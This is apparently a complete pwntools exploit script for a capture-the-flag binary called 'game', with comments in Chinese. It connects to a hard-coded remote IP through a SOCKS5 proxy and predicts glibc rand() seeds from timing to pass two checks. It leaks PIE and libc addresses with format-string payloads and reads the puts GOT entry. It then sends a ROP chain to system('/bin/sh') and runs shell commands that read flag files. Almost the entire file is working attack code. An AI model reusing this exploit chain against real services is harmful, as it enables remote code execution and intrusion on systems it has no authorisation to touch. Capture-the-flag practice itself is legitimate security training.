import json
import os
import re
import socket
import struct
import sys
import time
import urllib.request

from pwn import *

try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

HERE = os.path.dirname(os.path.abspath(__file__))

context.log_level = args.LOG or 'info'
context.arch = 'amd64'
context.endian = 'little'

# ---------------------------------------------------------------- 二进制 / 偏移
GAME = ELF(os.path.join(HERE, 'game'), checksec=False)
LIBC_PATH = os.path.join(HERE, 'libc_cache', 'libc6_2.39-0ubuntu8.8_amd64.so')
LIBC = ELF(LIBC_PATH, checksec=False)

OFF_RET_MAIN = 0x14da       # echo_line 返回到 main 的那条返回地址
OFF_ECHO = GAME.symbols['echo_line']
OFF_GUESS = GAME.symbols['guess_rand']
OFF_GETNAME = GAME.symbols['get_name']
OFF_RET = 0x101a            # 单独一个 ret，做栈对齐
OFF_PUTS_GOT = GAME.got['puts']
OFF_STRTOUL_GOT = GAME.got['strtoul']
OFF_LIBC_MAIN_RET = 0x2a1ca  # __libc_start_main+... 返回到 __libc_start_call_main 的偏移

assert OFF_ECHO == 0x12d8 and OFF_GUESS == 0x1369 and OFF_GETNAME == 0x1428, 'game 偏移变了？'
assert OFF_PUTS_GOT == 0x3f68, 'puts@got 偏移变了？'

PROXY = args.PROXY or '192.252.214.17:4145'
HOST = args.HOST or '103.163.47.230'
PORT = int(args.PORT or 35118)

ONE_WAY = 0.30              # 单程网络延迟估计（秒），用来对齐服务端 srand 的 seed
CMDS = [
    b'echo PWNED_START\n',
    b'id\n',
    b'cat /flag* 2>/dev/null\n',
    b'cat /home/*/flag* 2>/dev/null\n',
    b'ls -la / 2>/dev/null\n',
    b'ls -la . 2>/dev/null\n',
]

M32 = 0xFFFFFFFF


class GlibcRand:
    """复刻 glibc random()：TYPE_3 加法反馈，可预测 srand(seed) 后的第一个输出。"""

    def __init__(self, seed):
        r = [0] * 400
        seed &= M32
        if seed == 0:
            seed = 1
        r[0] = seed
        for i in range(1, 31):
            hi, lo = divmod(r[i - 1], 127773)
            word = 16807 * lo - 2836 * hi
            if word < 0:
                word += 2147483647
            r[i] = word & M32
        for i in range(31, 34):
            r[i] = r[i - 31]
        for i in range(34, 344):
            r[i] = (r[i - 31] + r[i - 3]) & M32
        self.r = r
        self.i = 344

    def next(self):
        i = self.i
        v = (self.r[i - 31] + self.r[i - 3]) & M32
        self.r[i] = v
        self.i = i + 1
        return v >> 1


def gate_answer(ts):
    return str(GlibcRand(int(ts)).next()).encode() + b'\n'


# ---------------------------------------------------------------- 连接
def socks5_connect(proxy, target, timeout=15):
    host, p = proxy.rsplit(':', 1)
    s = socket.create_connection((host, int(p)), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(b'\x05\x01\x00')
        if s.recv(2) != b'\x05\x00':
            raise RuntimeError('socks method reject')
        s.sendall(b'\x05\x01\x00\x01' + socket.inet_aton(target[0]) + struct.pack('>H', target[1]))
        r = s.recv(10)
        if len(r) < 2 or r[1] != 0:
            raise RuntimeError('socks connect rc=%s' % (r[1] if len(r) > 1 else '?'))
        return s
    except Exception:
        s.close()
        raise


def connect():
    if args.DIRECT:
        log.info('直连 %s:%d', HOST, PORT)
        io = remote(HOST, PORT, timeout=12)
    else:
        s = socks5_connect(PROXY, (HOST, PORT))
        log.success('via SOCKS5 %s -> %s:%d', PROXY, HOST, PORT)
        io = remote.fromsocket(s)
    io.timeout = 8
    return io


def align_send(io, data, lo=0.06, hi=0.28):
    """在每秒钟的 lo~hi 这一段里发送，避开跨秒导致服务端时间判断漂移。"""
    while True:
        t = time.time()
        if lo <= (t % 1) <= hi:
            io.send(data)
            return t
        time.sleep(0.006)


def fmt_addr(spec, target):
    """echo_line 里的 name 落点：spec 放开头，NUL 补齐到 16，再放目标地址（%6$ 位置）。"""
    b = spec.encode() + b'\x00'
    assert len(b) <= 16
    return b + b'\x00' * (16 - len(b)) + p64(target)


# ---------------------------------------------------------------- libc 定位
def resolve_libc(puts_addr, libc_ret):
    """先用自带 libc 校验；不匹配就查 libc.rip 并缓存下载。返回 (libc_base, libc, note)。"""
    base = libc_ret - OFF_LIBC_MAIN_RET
    if base + LIBC.symbols['puts'] == puts_addr:
        return base, LIBC, 'local libc'

    log.warning('本地 libc 不匹配（expect puts=%#x got=%#x），去 libc.rip 查',
                base + LIBC.symbols['puts'], puts_addr)
    body = json.dumps({'symbols': {'puts': hex(puts_addr),
                                   '__libc_start_main_ret': hex(libc_ret)}}).encode()
    req = urllib.request.Request('https://libc.rip/api/find', data=body,
                                 headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            hits = json.load(r)
    except Exception as e:
        raise RuntimeError('libc.rip 查询失败: %r' % (e,))
    if not hits:
        raise RuntimeError('libc.rip 没匹配到')

    entry = hits[0]
    cache = os.path.join(HERE, 'libc_cache')
    os.makedirs(cache, exist_ok=True)
    path = os.path.join(cache, entry['id'] + '.so')
    if not (os.path.exists(path) and os.path.getsize(path) > 100000):
        req = urllib.request.Request(entry['download_url'], headers={'User-Agent': 'curl/8'})
        with urllib.request.urlopen(req, timeout=120) as r:
            open(path, 'wb').write(r.read())
    libc = ELF(path, checksec=False)
    base = libc_ret - int(entry['symbols']['__libc_start_main_ret'], 16)
    return base, libc, entry['id']


def find_leak(data, expect):
    """在二进制回显里找 6 字节的 libc 指针，优先取满足 expect 的那一个。"""
    cands = []
    for i in range(0, max(0, len(data) - 5)):
        v = int.from_bytes(data[i:i + 6], 'little')
        if 0x700000000000 < v < 0x800000000000:
            cands.append(v)
    if expect in cands:
        return expect
    return cands[0] if cands else None


# ---------------------------------------------------------------- 主利用
def attempt(pad_rets=1, verbose=True):
    io = connect()
    try:
        # ---- banner：读到两个换行，用接收时刻反推服务端 srand 的 seed ----
        io.recvline(timeout=6)
        io.recvline(timeout=6)
        T = time.time()
        io.send(gate_answer(T - ONE_WAY))

        try:
            io.recvuntil('说出你想要说的话吧'.encode(), timeout=6)
        except EOFError:
            log.warning('第一道门没过（seed 猜错）')
            return None

        # ---- 泄漏 PIE / libc ----
        t1 = align_send(io, b'%15$p.%17$p\n')
        try:
            out = io.recvuntil('如果只是许愿'.encode(), timeout=6)
        except EOFError:
            log.warning('没收到泄漏回显')
            return None
        m = re.findall(rb'0x[0-9a-f]+', out)
        if len(m) < 2:
            log.warning('泄漏不足: %r', out[:80])
            return None
        base = int(m[0], 16) - OFF_RET_MAIN
        libc_ret = int(m[1], 16)
        if verbose:
            log.info('PIE base = %#x   libc_ret = %#x', base, libc_ret)
        if base & 0xfff:
            log.warning('PIE 基址没对齐，丢掉这次')
            return None

        # ---- 第二道随机数门（seed 跟着泄漏那次发送时刻走） ----
        io.recvuntil('做你想要做的事吧'.encode(), timeout=6)
        io.send(gate_answer(t1 + ONE_WAY))
        io.recvuntil('做你想要做的事吧'.encode(), timeout=6)

        # ---- 第一轮：回跳 echo_line 打 fmt，泄 puts ----
        chain1 = [base + OFF_RET, base + OFF_ECHO, base + OFF_GUESS, base + OFF_GETNAME]
        io.send(flat(b'A' * 0x40, p64(0), chain1))
        time.sleep(0.2)
        io.send(fmt_addr('%6$s', base + OFF_PUTS_GOT))

        try:
            data = io.recvuntil('如果只是许愿'.encode(), timeout=5)
        except EOFError:
            data = b''
        data = data or b''

        libc_base = libc_ret - OFF_LIBC_MAIN_RET
        want = libc_base + LIBC.symbols['puts']
        puts_addr = find_leak(data, want)
        if not puts_addr:
            log.warning('puts 泄漏没找到，回显: %s', data[:48].hex())
            return None
        if verbose:
            log.info('puts = %#x', puts_addr)

        libc_base, libc, note = resolve_libc(puts_addr, libc_ret)
        system = libc_base + libc.symbols['system']
        binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
        try:
            pop_rdi = libc_base + ROP(libc).find_gadget(['pop rdi', 'ret']).address
        except Exception:
            pop_rdi = libc_base + 0x10c08d
        if verbose:
            log.success('libc = %s  base = %#x  system = %#x  binsh = %#x  pop_rdi = %#x',
                        note, libc_base, system, binsh, pop_rdi)

        # ---- 借 guess_rand 读掉一个数字，回到读名字 ----
        try:
            io.recvuntil('做出你的选择吧'.encode(), timeout=4)
        except EOFError:
            log.warning('没等到菜单')
            return None
        io.sendline(b'1')
        time.sleep(0.5)
        io.recvrepeat(0.4)

        # ---- 第二轮：直接 ROP -> system("/bin/sh") ----
        chain = [base + OFF_RET] * max(1, pad_rets) + [pop_rdi, binsh, system]
        out = b''
        try:
            io.send(flat(b'C' * 0x40, p64(0), chain))
            time.sleep(1.0)
            out += io.recvrepeat(0.5)
            for c in CMDS:
                io.send(c)
                time.sleep(0.4)
                out += io.recvrepeat(0.5)
        except EOFError:
            log.warning('shell 提前关闭了，先看已经收到的输出')
        return out
    finally:
        io.close()


def probe(fmt):
    """只做一次格式串探测：过第一道门，然后把 fmt 丢进去，打印原始回显。"""
    io = connect()
    try:
        io.recvline(timeout=6)
        io.recvline(timeout=6)
        T = time.time()
        io.send(gate_answer(T - ONE_WAY))
        head = io.recvrepeat(1.0)
        print('--- 第一道门回显 ---')
        print(head.decode('utf-8', 'replace'))
        io.sendline(fmt.encode())
        out = io.recvrepeat(1.5)
        print('--- fmt 回显 ---')
        print(out.decode('utf-8', 'replace'))
        return out
    finally:
        io.close()


def main():
    if args.probe:
        probe(args.probe)
        return 0

    tries = int(args.RETRY or 30)
    for i in range(tries):
        pad = (i % 3) + 1
        log.info('=== 第 %d/%d 次尝试（rets=%d） ===', i + 1, tries, pad)
        try:
            out = attempt(pad_rets=pad)
        except Exception as e:
            log.warning('异常: %r', e)
            continue
        if not out:
            continue

        text = out.decode('utf-8', 'replace')
        if text.strip():
            print(text[:800])
        m = re.search(r'HTUCTF\{[^}]*\}|flag\{[^}]*\}', text)
        if m:
            log.success('FLAG = %s', m.group(0))
            dst = os.path.join(HERE, 'flag.txt')
            if os.path.exists(dst):
                open(dst + '.old', 'wb').write(open(dst, 'rb').read())   # 老内容留档
            open(dst, 'wb').write(m.group(0).encode())
            return 0
    log.failure('%d 次都没成功，检查代理/时间同步（seed 靠时间猜，机器时钟要准）', tries)
    return 1


if __name__ == '__main__':
    sys.exit(main())
